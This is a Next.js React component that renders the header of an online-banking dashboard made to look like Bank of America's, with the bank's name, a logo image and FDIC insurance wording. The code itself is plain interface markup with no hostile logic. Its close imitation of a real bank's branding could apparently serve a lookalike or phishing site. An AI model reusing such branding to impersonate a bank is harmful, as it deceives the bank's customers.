'use client';

import Link from 'next/link';
import { usePathname } from 'next/navigation';
import Image from 'next/image';
import { useState } from 'react';
import NotificationDropdown from './NotificationDropdown';
import SearchModal from './SearchModal';

interface DashboardHeaderProps {
  userName?: string;
}

const navTabs = [
  { label: 'Accounts', href: '/dashboard' },
  { label: 'Bill Pay & Transfers', href: '/dashboard/transfers' },
];

export default function DashboardHeader({ userName }: DashboardHeaderProps) {
  const pathname = usePathname();
  const [showProfileMenu, setShowProfileMenu] = useState(false);
  const [showSearch, setShowSearch] = useState(false);

  const isActiveTab = (href: string) => {
    if (href === '/dashboard') {
      return pathname === '/dashboard' || pathname.startsWith('/dashboard/account');
    }
    return pathname.startsWith(href);
  };

  return (
    <header className="w-full bg-white border-b border-[#ddd]">
      {/* FDIC Banner */}
      <div className="bg-[#f5f5f5] border-b border-[#ddd]">
        <div className="max-w-[1200px] mx-auto px-4 py-1 text-center">
          <span className="text-[11px] text-[#666]">
            Bank of America deposit products: <strong className="font-bold">FDIC</strong> FDIC-Insured - Backed by the full faith and credit of the U.S. Government
          </span>
        </div>
      </div>

      {/* Main Header Bar */}
      <div className="max-w-[1200px] mx-auto px-4">
        <div className="flex items-center justify-between py-3">
          {/* Logo */}
          <Link href="/dashboard" className="flex items-center">
            <Image 
              src="/asset-v1-h.png" 
              alt="Bank of America" 
              width={180} 
              height={22}
              className="h-[22px] w-auto"
              priority
            />
          </Link>

          {/* Right Side - Profile & Sign Out */}
          <div className="flex items-center gap-4">
            {/* Search */}
            <button 
              onClick={() => setShowSearch(true)}
              className="flex items-center gap-2 px-3 py-1.5 text-[13px] text-[#0066b2] hover:bg-[#f5f5f5] rounded transition-colors"
              aria-label="Search"
            >
              <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" />
              </svg>
              <span className="hidden sm:inline">Search</span>
            </button>

            {/* Notifications */}
            <NotificationDropdown />

            {/* Profile Menu */}
            <div className="relative">
              <button 
                onClick={() => setShowProfileMenu(!showProfileMenu)}
                className="flex items-center gap-2 px-3 py-1.5 text-[13px] text-[#333] hover:bg-[#f5f5f5] rounded transition-colors"
              >
                <svg className="w-5 h-5 text-[#666]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" />
                </svg>
                <span className="hidden sm:inline">{userName || 'Profile'}</span>
                <svg className="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 9l-7 7-7-7" />
                </svg>
              </button>

              {/* Dropdown Menu */}
              {showProfileMenu && (
                <div className="absolute right-0 top-full mt-1 w-48 bg-white border border-[#ddd] rounded shadow-lg z-50">
                  <Link 
                    href="/dashboard/profile" 
                    className="block px-4 py-2 text-[13px] text-[#333] hover:bg-[#f5f5f5]"
                    onClick={() => setShowProfileMenu(false)}
                  >
                    Profile & Settings
                  </Link>
                  <Link 
                    href="/dashboard/notifications" 
                    className="block px-4 py-2 text-[13px] text-[#333] hover:bg-[#f5f5f5]"
                    onClick={() => setShowProfileMenu(false)}
                  >
                    Alerts & Notifications
                  </Link>
                  <hr className="my-1 border-[#ddd]" />
                  <Link 
                    href="/api/user/logout" 
                    className="block px-4 py-2 text-[13px] text-[#c41230] hover:bg-[#f5f5f5]"
                  >
                    Sign Out
                  </Link>
                </div>
              )}
            </div>
          </div>
        </div>

        {/* Navigation Tabs */}
        <nav className="flex items-center gap-1 -mb-px overflow-x-auto">
          {navTabs.map((tab) => (
            <Link
              key={tab.label}
              href={tab.href}
              className={`px-4 py-3 text-[13px] font-normal whitespace-nowrap border-b-2 transition-colors ${
                isActiveTab(tab.href)
                  ? 'text-[#333] border-[#c41230]'
                  : 'text-[#333] border-transparent hover:text-[#000] hover:border-[#ddd]'
              }`}
            >
              {tab.label}
            </Link>
          ))}
        </nav>
      </div>

      <SearchModal 
        isOpen={showSearch} 
        onClose={() => setShowSearch(false)} 
      />
    </header>
  );
}
